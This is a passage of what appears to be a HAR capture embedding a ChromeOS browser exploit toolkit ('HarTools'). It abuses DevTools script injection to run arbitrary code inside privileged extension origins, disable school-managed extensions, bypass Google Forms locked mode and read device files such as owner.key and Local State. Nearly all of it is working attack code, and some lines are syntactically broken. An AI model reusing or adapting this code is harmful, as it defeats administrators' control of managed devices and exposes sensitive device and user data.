        <a class="button hardcoded" ext="gndmhdcefbhlchkhipcnnbkcmicncehk" href="javascript:void(0)">gforms locked mode (enrolled cbs)</a>
        <a class="button hardcoded" ext="inoeonmfapjbbkmdafoankkfajkcphgd" href="javascript:void(0)">read and write</a>
      </p>

      <p>Press M for evaluating under <a class="button" id="devdbg" href="javascript:void(0)">devtools</a> context</p>
      <p>Typing cancel in any prompt will cancel the current operation.</p>

      <a class="button" href="devtools://devtools/bundled/inspector.html?experiments=true">Re-open devtools</a>
      <a class="button" href="javascript:void(0)" id="updater">Update payload</a>
      <a class="button" href="javascript:void(0)" id="cleanup">Cleanup and reset for extension</a>
      <a class="button" href="javascript:void(0)" id="activate">Chrome URLs</a>
      <a class="button" href="javascript:void(0)" id="activate2">Chrome URLs 2</a>
      <a class="button" href="javascript:void(0)" id="troll">Inject Tr3nch into extension</a>
    </div>

    <script defer>
      document.addEventListener("keydown", function(event) {
        if (event.key === "q") {
          document.getElementById("extdbg").click();
        } else if (event.key === "m") {
          document.getElementById("devdbg").click();
        } else if (["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(event.key)) {
          document.querySelectorAll(`.hardcoded`)[parseInt(event.key) - 1]?.click();
        }
      });
    </script>
  </body>
</html>==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?/ payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#troll').onclick = function () {
                let removed = atob("Ly8gcmVtb3ZlZCBhdCB0aGUgcmVxdWVzdCBvZiB6ZWdsb2wKY29uc29sZS5sb2coMSk7CmFsZXJ0KCJUaGlzIHBheWxvYWQgaGFzIGJlZW4gcmVtb3ZlZCwgaXQgd2lsbCBub3QgYmUgZml4ZWQgb3IgdXBkYXRlZCBhZ2FpbiIpOw==");
                eval(removed);
            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()==\"))})()"
            },
            {
              "name": ":scheme",
              "value": "javascript"
            },
            {
              "name": "accept",
              "value": "*/*"
            },
            {
              "name": "user-agent",
              "value": "Mozilla/5.0"
            }
          ],
          "queryString": [],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "",
          "httpVersion": "h3",
          "headers": [
            {
              "name": "content-type",
              "value": "application/javascript; charset=utf-8"
            }
          ],
          "cookies": [],
          "content": {
            "size": 113478,
            "mimeType": "application/javascript",
            "text": "((function () {\n    if (!opener) {\n        opener = window;\n    }\n    // alert(origin);\n\n    //     window.w = w;\n    // })\n    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);\n    window.opener.close();\n    w.addEventListener(\"load\", async () => {\n        if (!w.DevToolsAPI) {\n            console.log(\"reloading\");\n            w.opener = null;\n            w.location.reload();\n        }\n        await sleep(500);\n        console.log(\"Got DevToolsAPI object from opened window:\", w.DevToolsAPI);\n        exploit(w);\n    });\n\n    window.w = w;\n\n\n    function exploit(w) {\n\n\n        function ui() {\n            const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\";\n            var globalUID = 0;\n            let globalMap = [];\n            function payload_swamp(w, d) {\n                const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                console.log('hi');\n                if (location.origin.includes(\"chrome-extension://\" + pdfId)) {\n                    w.close();\n                    chrome.tabs.getCurrent(function (info) {\n                        chrome.windows.create({\n                            setSelfAsOpener: true,\n                            url: mojoURL\n                        }, function (win) {\n                            const r = win.tabs[0].id;\n                            chrome.tabs.executeScript(r, { code: `location.href = \\\"javascript:${atob('%%CHROMEPAYLOAD%%')}\\\"` });\n\n                        })\n                    })\n\n\n                    return;\n                }\n                // console.log(d);\n                // w.setTimeout(function() {\n                const blob_url = new Blob([\"alert(1)\"], { type: \"text/html\" });\n\n                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {\n                    function removeFile(file) {\n                        return new Promise(function (resolve, reject) {\n                            fs.root.getFile(file, { create: true }, function (entry) {\n                                entry.remove(resolve);\n                            })\n                        });\n                    }\n                    function writeFile(file, data) {\n                        return new Promise((resolve, reject) => {\n                            fs.root.getFile(file, { create: true }, function (entry) {\n                                entry.remove(function () {\n                                    fs.root.getFile(file, { create: true }, function (entry) {\n                                        entry.createWriter(function (writer) {\n                                            writer.write(new Blob([data]));\n                                            resolve(entry.toURL());\n                                        })\n                                    })\n                                })\n                            })\n                        })\n                    };\n                    if (d.cleanup) {\n                        console.log(\"cleaning up\");\n                        debugger;\n                        await removeFile('index.js');\n                        await removeFile('index.html');\n                        alert(\"Cleaned up successfully!\");\n                        cleanup();\n                        w.close();\n                        return;\n                    }\n                    await writeFile('index.js', atob(`onerror = alert;

const uiTemplate = `

`;

if (localStorage.getItem("userdefIds") === null)
    localStorage.setItem("userdefIds", JSON.stringify([]));

Array.prototype.remove = function(item) {
    if (this.indexOf(item) === -1) throw new Error("not in array");
    this.splice(this.indexOf(item), 1);
};

function makeToast(msg, time) {
    const popover = document.createElement("article");
    popover.popover = "manual";
    popover.classList.add("toast");
    popover.classList.add("newest");
    popover.textContent = msg;
    popover.style.translate = "-50%";

    document.body.appendChild(popover);
    popover.showPopover();

    setTimeout(() => {
        popover.hidePopover();
        setTimeout(() => {
            popover.remove();
        }, 500);
    }, time * 1000);

    popover.addEventListener("toggle", (event) => {
        if (event.newState === "open") {
            moveToasts();
        }
    });
}

function moveToasts() {
    const toasts = document.querySelectorAll(".toast");

    toasts.forEach((toast) => {
        if (toast.classList.contains("newest")) {
            toast.style.top = `5px`;
            toast.classList.remove("newest");
        } else {
            const prevValue = toast.style.top.replace("px", "");
            const newValue = parseInt(prevValue) + toast.clientHeight + 10;
            toast.style.top = `${newValue}px`;
        }
    });
}

function makeDialog(title, msg, oncancel, onconfirm) {
    const dialog = document.createElement("dialog");
    const confirmBtn = document.createElement("button");
    const cancelBtn = document.createElement("button");
    const head = document.createElement("h1");
    const body = document.createElement("div");
    const foot = document.createElement("div");

    dialog.appendChild(head);
    dialog.appendChild(body);
    dialog.appendChild(foot);
    foot.appendChild(confirmBtn);
    foot.appendChild(cancelBtn);
    document.body.appendChild(dialog);

    head.textContent = title;

    body.style.overflowY = "scroll";
    body.style.color = "rgb(220 220 220)";
    body.style.fontSize = "1rem";
    body.style.borderRadius = "10px";
    body.style.padding = "10px";
    body.style.marginBottom = "10px";

    if (Array.isArray(msg)) {
        body.style.border = "solid 1px #1d1d1d";
        msg.forEach((value) => {
            let item = document.createElement("p");
            item.textContent = value;
            body.appendChild(item);
        });
    } else {
        body.style.border = "solid 1px #2d2d2d";
        body.textContent = msg;
    }

    foot.style.height = "fit-content";
    foot.style.marginTop = "auto";
    foot.style.display = "flex";
    foot.style.flexDirection = "row-reverse";

    confirmBtn.classList.add("confirmBtn");
    confirmBtn.addEventListener("click", () => {
        dialog.close();
        onconfirm();
        setTimeout(() => dialog.remove(), 1000);
    });
    confirmBtn.textContent = "Confirm";

    cancelBtn.classList.add("cancelBtn");
    cancelBtn.addEventListener("click", () => {
        dialog.close();
        oncancel();
        setTimeout(() => dialog.remove(), 1000);
    });
    cancelBtn.textContent = "Cancel";

    dialog.showModal();
}

async function extensionExists(id) {
    return new Promise((resolve) =>
        chrome.management.getAll((extensions) =>
            resolve(extensions.some((ext) => ext.id === id))
        )
    );
}

const managementTemplate = `
<title>Untitled document</title>
<link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/docs.ico">
<div id="chrome_management_disable_ext">
  <div class="header">
    <img src="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
    <h1> chrome.management Disable Extensions </h1>
  </div>
  <p class="description">GitHub repo: https://github.com/crossjbly/HarTools/ <br> XSS found by <a href="https://crossjbly.pages.dev/">crossjbly</a> <br> UI made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a><br></p><hr>
  <whitebuttons>
  <button id="current-extension">Disable injected extension</button>
  <button id="rmv-cmn-blt">Remove Bloat</button>
  <button id="disable-userdef-exts">Disable user defined list of extensions</button>
  </whitebuttons>
	<hr>
  <br /><br />
  <ul class="extlist">
  </ul>

  <div style="height: 50px"></div>
</div>

`;
let savedExtList = [];
const kFiles = [
    "/var/lib/devicesettings/owner.key",
    "/home/chronos/Local State"
]
async function readFile(path) {
    return (await fetch("file://" + path)).arrayBuffer();
}
async function findLastPolicyFile() {
    const kDevicePolicy = "/var/lib/devicesettings/policy.";
    let foundSomething = false;
    let i = 0;
    while (true) {
        try {
            console.log("Trying " + kDevicePolicy + i);
            await readFile(kDevicePolicy + i);
            foundSomething = true;
        } catch {
            if (foundSomething) {
                return kDevicePolicy + (i - 1);
            }
        }
        i++;
    }
}

function doesNeedFileAccess() {
    const sc = chrome.runtime.getManifest().permissions;
    return sc.includes("activeTab") || sc.includes("<all_urls>");
}

function normalizeStringPosix(path, allowAboveRoot) {
    var res = '';
    var lastSegmentLength = 0;
    var lastSlash = -1;
    var dots = 0;
    var code;
    for (var i = 0; i <= path.length; ++i) {
        if (i < path.length)
            code = path.charCodeAt(i);
        else if (code === 47)
            break;
        else
            code = 47;
        if (code === 47) {
            if (lastSlash === i - 1 || dots === 1) {

            } else if (lastSlash !== i - 1 && dots === 2) {
                if (res.length < 2 || lastSegmentLength !== 2 || res.charCodeAt(res.length - 1) !== 46 || res.charCodeAt(res.length - 2) !== 46) {
                    if (res.length > 2) {
                        var lastSlashIndex = res.lastIndexOf('/');
                        if (lastSlashIndex !== res.length - 1) {
                            if (lastSlashIndex === -1) {
                                res = '';
                                lastSegmentLength = 0;
                            } else {
                                res = res.slice(0, lastSlashIndex);
                                lastSegmentLength = res.length - 1 - res.lastIndexOf('/');
                            }
                            lastSlash = i;
                            dots = 0;
                            continue;
                        }
                    } else if (res.length === 2 || res.length === 1) {
                        res = '';
                        lastSegmentLength = 0;
                        lastSlash = i;
                        dots = 0;
                        continue;
                    }
                }
                if (allowAboveRoot) {
                    if (res.length > 0)
                        res += '/..';
                    else
                        res = '..';
                    lastSegmentLength = 2;
                }
            } else {
                if (res.length > 0)
                    res += '/' + path.slice(lastSlash + 1, i);
                else
                    res = path.slice(lastSlash + 1, i);
                lastSegmentLength = i - lastSlash - 1;
            }
            lastSlash = i;
            dots = 0;
        } else if (code === 46 && dots !== -1) {
            ++dots;
        } else {
            dots = -1;
        }
    }
    return res;
}

function _format(sep, pathObject) {
    var dir = pathObject.dir || pathObject.root;
    var base = pathObject.base || (pathObject.name || '') + (pathObject.ext || '');
    if (!dir) {
        return base;
    }
    if (dir === pathObject.root) {
        return dir + base;
    }
    return dir + sep + base;
}
var posix = {

    resolve: function resolve() {
        var resolvedPath = '';
        var resolvedAbsolute = false;
        var cwd;
        for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
            var path;
            if (i >= 0)
                path = arguments[i];
            else {
                if (cwd === undefined)
                    cwd = process.cwd();
                path = cwd;
            }
            assertPath(path);

            if (path.length === 0) {
                continue;
            }
            resolvedPath = path + '/' + resolvedPath;
            resolvedAbsolute = path.charCodeAt(0) === 47;
        }

        resolvedPath = normalizeStringPosix(resolvedPath, !resolvedAbsolute);
        if (resolvedAbsolute) {
            if (resolvedPath.length > 0)
                return '/' + resolvedPath;
            else
                return '/';
        } else if (resolvedPath.length > 0) {
            return resolvedPath;
        } else {
            return '.';
        }
    },
    normalize: function normalize(path) {
        assertPath(path);
        if (path.length === 0) return '.';
        var isAbsolute = path.charCodeAt(0) === 47;
        var trailingSeparator = path.charCodeAt(path.length - 1) === 47;

        path = normalizeStringPosix(path, !isAbsolute);
        if (path.length === 0 && !isAbsolute) path = '.';
        if (path.length > 0 && trailingSeparator) path += '/';
        if (isAbsolute) return '/' + path;
        return path;
    },
    isAbsolute: function isAbsolute(path) {
        assertPath(path);
        return path.length > 0 && path.charCodeAt(0) === 47;
    },
    join: function join() {
        if (arguments.length === 0)
            return '.';
        var joined;
        for (var i = 0; i < arguments.length; ++i) {
            var arg = arguments[i];
            assertPath(arg);
            if (arg.length > 0) {
                if (joined === undefined)
                    joined = arg;
                else
                    joined += '/' + arg;
            }
        }
        if (joined === undefined)
            return '.';
        return posix.normalize(joined);
    },
    relative: function relative(from, to) {
        assertPath(from);
        assertPath(to);
        if (from === to) return '';
        from = posix.resolve(from);
        to = posix.resolve(to);
        if (from === to) return '';

        var fromStart = 1;
        for (; fromStart < from.length; ++fromStart) {
            if (from.charCodeAt(fromStart) !== 47)
                break;
        }
        var fromEnd = from.length;
        var fromLen = fromEnd - fromStart;

        var toStart = 1;
        for (; toStart < to.length; ++toStart) {
            if (to.charCodeAt(toStart) !== 47)
                break;
        }
        var toEnd = to.length;
        var toLen = toEnd - toStart;

        var length = fromLen < toLen ? fromLen : toLen;
        var lastCommonSep = -1;
        var i = 0;
        for (; i <= length; ++i) {
            if (i === length) {
                if (toLen > length) {
                    if (to.charCodeAt(toStart + i) === 47) {

                        return to.slice(toStart + i + 1);
                    } else if (i === 0) {

                        return to.slice(toStart + i);
                    }
                } else if (fromLen > length) {
                    if (from.charCodeAt(fromStart + i) === 47) {

                        lastCommonSep = i;
                    } else if (i === 0) {

                        lastCommonSep = 0;
                    }
                }
                break;
            }
            var fromCode = from.charCodeAt(fromStart + i);
            var toCode = to.charCodeAt(toStart + i);
            if (fromCode !== toCode)
                break;
            else if (fromCode === 47)
                lastCommonSep = i;
        }
        var out = '';

        for (i = fromStart + lastCommonSep + 1; i <= fromEnd; ++i) {
            if (i === fromEnd || from.charCodeAt(i) === 47) {
                if (out.length === 0)
                    out += '..';
                else
                    out += '/..';
            }
        }

        if (out.length > 0)
            return out + to.slice(toStart + lastCommonSep);
        else {
            toStart += lastCommonSep;
            if (to.charCodeAt(toStart) === 47)
                ++toStart;
            return to.slice(toStart);
        }
    },
    _makeLong: function _makeLong(path) {
        return path;
    },
    dirname: function dirname(path) {
        assertPath(path);
        if (path.length === 0) return '.';
        var code = path.charCodeAt(0);
        var hasRoot = code === 47;
        var end = -1;
        var matchedSlash = true;
        for (var i = path.length - 1; i >= 1; --i) {
            code = path.charCodeAt(i);
            if (code === 47) {
                if (!matchedSlash) {
                    end = i;
                    break;
                }
            } else {

                matchedSlash = false;
            }
        }
        if (end === -1) return hasRoot ? '/' : '.';
        if (hasRoot && end === 1) return '//';
        return path.slice(0, end);
    },
    basename: function basename(path, ext) {
        if (ext !== undefined && typeof ext !== 'string') throw new TypeError('"ext" argument must be a string');

        var start = 0;
        var end = -1;
        var matchedSlash = true;
        var i;
        if (ext !== undefined && ext.length > 0 && ext.length <= path.length) {
            if (ext.length === path.length && ext === path) return '';
            var extIdx = ext.length - 1;
            var firstNonSlashEnd = -1;
            for (i = path.length - 1; i >= 0; --i) {
                var code = path.charCodeAt(i);
                if (code === 47) {

                    if (!matchedSlash) {
                        start = i + 1;
                        break;
                    }
                } else {
                    if (firstNonSlashEnd === -1) {

                        matchedSlash = false;
                        firstNonSlashEnd = i + 1;
                    }
                    if (extIdx >= 0) {

                        if (code === ext.charCodeAt(extIdx)) {
                            if (--extIdx === -1) {

                                end = i;
                            }
                        } else {

                            extIdx = -1;
                            end = firstNonSlashEnd;
                        }
                    }
                }
            }
            if (start === end) end = firstNonSlashEnd;
            else if (end === -1) end = path.length;
            return path.slice(start, end);
        } else {
            for (i = path.length - 1; i >= 0; --i) {
                if (path.charCodeAt(i) === 47) {

                    if (!matchedSlash) {
                        start = i + 1;
                        break;
                    }
                } else if (end === -1) {

                    matchedSlash = false;
                    end = i + 1;
                }
            }
            if (end === -1) return '';
            return path.slice(start, end);
        }
    },
    extname: function extname(path) {
        assertPath(path);
        var startDot = -1;
        var startPart = 0;
        var end = -1;
        var matchedSlash = true;

        var preDotState = 0;
        for (var i = path.length - 1; i >= 0; --i) {
            var code = path.charCodeAt(i);
            if (code === 47) {

                if (!matchedSlash) {
                    startPart = i + 1;
                    break;
                }
                continue;
            }
            if (end === -1) {

                matchedSlash = false;
                end = i + 1;
            }
            if (code === 46) {

                if (startDot === -1)
                    startDot = i;
                else if (preDotState !== 1)
                    preDotState = 1;
            } else if (startDot !== -1) {

                preDotState = -1;
            }
        }
        if (startDot === -1 || end === -1 ||

            preDotState === 0 ||

            preDotState === 1 && startDot === end - 1 && startDot === startPart + 1) {
            return '';
        }
        return path.slice(startDot, end);
    },
    format: function format(pathObject) {
        if (pathObject === null || typeof pathObject !== 'object') {
            throw new TypeError('The "pathObject" argument must be of type Object. Received type ' + typeof pathObject);
        }
        return _format('/', pathObject);
    },
    parse: function parse(path) {
        assertPath(path);
        var ret = {
            root: '',
            dir: '',
            base: '',
            ext: '',
            name: ''
        };
        if (path.length === 0) return ret;
        var code = path.charCodeAt(0);
        var isAbsolute = code === 47;
        var start;
        if (isAbsolute) {
            ret.root = '/';
            start = 1;
        } else {
            start = 0;
        }
        var startDot = -1;
        var startPart = 0;
        var end = -1;
        var matchedSlash = true;
        var i = path.length - 1;

        var preDotState = 0;

        for (; i >= start; --i) {
            code = path.charCodeAt(i);
            if (code === 47) {

                if (!matchedSlash) {
                    startPart = i + 1;
                    break;
                }
                continue;
            }
            if (end === -1) {

                matchedSlash = false;
                end = i + 1;
            }
            if (code === 46) {

                if (startDot === -1) startDot = i;
                else if (preDotState !== 1) preDotState = 1;
            } else if (startDot !== -1) {

                preDotState = -1;
            }
        }
        if (startDot === -1 || end === -1 ||

            preDotState === 0 ||

            preDotState === 1 && startDot === end - 1 && startDot === startPart + 1) {
            if (end !== -1) {
                if (startPart === 0 && isAbsolute) ret.base = ret.name = path.slice(1, end);
                else ret.base = ret.name = path.slice(startPart, end);
            }
        } else {
            if (startPart === 0 && isAbsolute) {
                ret.name = path.slice(1, startDot);
                ret.base = path.slice(1, end);
            } else {
                ret.name = path.slice(startPart, startDot);
                ret.base = path.slice(startPart, end);
            }
            ret.ext = path.slice(startDot, end);
        }
        if (startPart > 0) ret.dir = path.slice(0, startPart - 1);
        else if (isAbsolute) ret.dir = '/';
        return ret;
    },
    sep: '/',
    delimiter: ':',
    win32: null,
    posix: null
};
const slides = [];
let activeSlideIdx = 0;
const handleCallbacks_ = [];
const WAIT_FOR_FINISH = 1;
requestAnimationFrame(function a(t) {
    for (const cb of handleCallbacks_) {
        let m;
        if ((m = cb.f.apply(null, [t - cb.t]))) {
            if (m === 1) {
                return;
            } else {
                handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
            }
        }
    }
    requestAnimationFrame(a);
});
const handleInAnimationFrame = (cb, thiz = null, args = []) => {
    handleCallbacks_.push({
        f: cb,
        t: performance.now(),
    });
};

class DefaultExtensionCapabilities {
    static template = `
  <title>Untitled document</title>
  <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/docs.ico">
  <div id="ext_default">
    <div id="default_extension_capabilities">
      <div class="header">
        <img src="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
        <h1> Default Extension Capabilities </h1>
      </div>
      <div id="tabs-buttons">
        <p>On tab update</p>
        <div id="toggleable-buttons">
		<whitebuttons>
          <button id="eruda">Eruda</button>
          <button id="chii">Chii</button>
          <button id="adblock">Adblock</button>
          <button id="edpuzzle">Edpuzzle hax</button>
          <!-- <button id="glocked">Gforms Locked Mode bypass</button> -->
		</whitebuttons>
        </div>
      </div>
      <div id="other-buttons">
        <p>Other scripts</p>
		<whitebuttons>
        <button id="swamp">Swamp</button>
        <button id="update">Update Hartools</button>
        <button id="quick-rmv-blt">Quick Remove Bloat (used w/ gforms exten)</button>
        <button id="hstfld">History Flood</button>
		</whitebuttons>
      </div>
      <h2>Evaluate code</h1>
        <div class="container">
          <textarea id="code" placeholder="Enter JavaScript to inject"></textarea>
        </div>
        <button id="code-run">Run</button>
        <div id="code-output"></div>

    </div>
    <div id="extension_tabs_default">
      <button id="tabreload">Refresh Tabs</button>
      <ul>
      </ul>
      <input id="TabURLInput"/> <button id="TabURLSubmit">Create</button>
    </div>
  </div>
  `;
    updateTabList() {
        if (this.disarmed) {
            return;
        }

        if (this.tabListInProgress) {

            return;
        }
        this.tabListInProgress = true;

        const tablist = document.body.querySelector("#extension_tabs_default ul");

        tablist.innerHTML = "";
        const thiz = this;
        chrome.windows.getAll(function(win) {
            win.forEach(function(v) {
                chrome.tabs.query({
                    windowId: v.id
                }, function(tabInfos) {
                    tabInfos.forEach(function(info) {
                        const div = document.createElement("div");
                        div.className = "tablist-item";
                        div.innerHTML = `<img ${
              chrome.tabs && (info.favIconUrl?.length ?? 0) > 0
                ? `src="${info.favIconUrl}"`
                : ""
            }/><span class="tab-name">${info.title} <litstuff> ${info.url}<litstuff></span>`;
                        if (chrome.scripting || chrome.tabs.executeScript) {
                            const runButton = document.createElement("button");
                            runButton.textContent = "Run";
                            runButton.onclick = () => runCode(true, info.id);
                            div.appendChild(runButton);
                        }

                        const previewButton = document.createElement("button");
                        previewButton.textContent = "Preview";

                        previewButton.onclick = () => {
                            thiz.disarm = true;

                            thiz.previewing = true;

                            chrome.windows.update(
                                info.windowId, {
                                    focused: true,
                                },
                                function() {
                                    chrome.tabs.update(info.id, {
                                        active: true
                                    });
                                }
                            );
                            window.currentTimeout = setTimeout(function m() {
                                clearTimeout(window.currentTimeout);

                                chrome.tabs.getCurrent(function(tab) {
                                    chrome.windows.update(
                                        tab.windowId, {
                                            focused: true,
                                        },
                                        function() {
                                            chrome.tabs.update(tab.id, {
                                                active: true
                                            });
                                            thiz.disarm = false;
                                            thiz.previewing = false;
                                        }
                                    );
                                });
                            }, 100);
                        };

                        div.appendChild(previewButton);
                        tablist.appendChild(div);
                    });
                    thiz.tabListInProgress = false;
                });
            });
        });
    }
    activate() {
        document.body.insertAdjacentHTML(
            "beforeend",
            DefaultExtensionCapabilities.template
        );

        document.body
            .querySelector("#ext_default")
            .querySelectorAll("button")
            .forEach(function(btn) {

                btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
            }, this);

        this.updateTabList();
        for (let i in chrome.tabs) {
            if (i.startsWith("on")) {
                chrome.tabs[i].addListener(() => {
                    this.updateTabList();
                });
            }
        }

    }
    static getFS() {
        return new Promise(function(resolve) {
            webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
        });
    }
    static async writeFile(file, data) {
        const fs = await DefaultExtensionCapabilities.getFS();
        return new Promise((resolve, reject) => {
            fs.root.getFile(file, {
                create: true
            }, function(entry) {
                entry.remove(function() {
                    fs.root.getFile(file, {
                        create: true
                    }, function(entry) {
                        entry.createWriter(function(writer) {
                            writer.write(new Blob([data]));
                            writer.onwriteend = resolve.bind(null, entry.toURL());
                        });
                    });
                });
            });
        });
    }
    static async evalCode(code) {
        const url = await DefaultExtensionCapabilities.writeFile("src.js", code);
        let script =
            document.body.querySelector("#evaluate_elem") ??
            document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);
    }

    async onBtnClick_(b) {
        switch (b.id) {
            case "code_evaluate": {
                console.log("Evaluating code!");
                const x = document.querySelector("#code_input").value;
                const fs = await DefaultExtensionCapabilities.getFS();
                DefaultExtensionCapabilities.evalCode(x);
            }
            case "tabreload": {
                this.updateTabList();
            }
        }
    }
}
class HostPermissions {
    activate() {}
}

function createExtensionCard(name, id, enabled, icon_url) {
  const li = document.createElement("li");
  li.className = "extension-card";

  const headerDiv = document.createElement("div");
  headerDiv.className = "extension-header";

  const icon = document.createElement("img");
  icon.className = "extension-icon";
  icon.src = icon_url;
  icon.alt = "Extension Icon";

  const nameDiv = document.createElement("div");
  nameDiv.className = "extension-name";
  nameDiv.textContent = name;

  headerDiv.appendChild(icon);
  headerDiv.appendChild(nameDiv);

  const idDiv = document.createElement("div");
  idDiv.className = "extension-id";
  idDiv.textContent = id;

  const switchLabel = document.createElement("label");
  switchLabel.className = "switch";

  const checkbox = document.createElement("input");
  checkbox.type = "checkbox";
  if (enabled) checkbox.checked = true;

  const sliderSpan = document.createElement("span");
  sliderSpan.className = "slider";

  switchLabel.appendChild(checkbox);
  switchLabel.appendChild(sliderSpan);

  li.appendChild(headerDiv);
  li.appendChild(idDiv);
  li.appendChild(switchLabel);

  return li;
}

function createExtensionCardAll(enabled = true) {
  const li = document.createElement("li");
  li.className = "extension-card-all";
  li.innerHTML = `
    <div class="extension-header">
      <img class="extension-icon" src="https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/refs/heads/main/images/XOsX.gif" />
      <div class="extension-name">All Extensions</div>
    </div>
    <label class="switch">
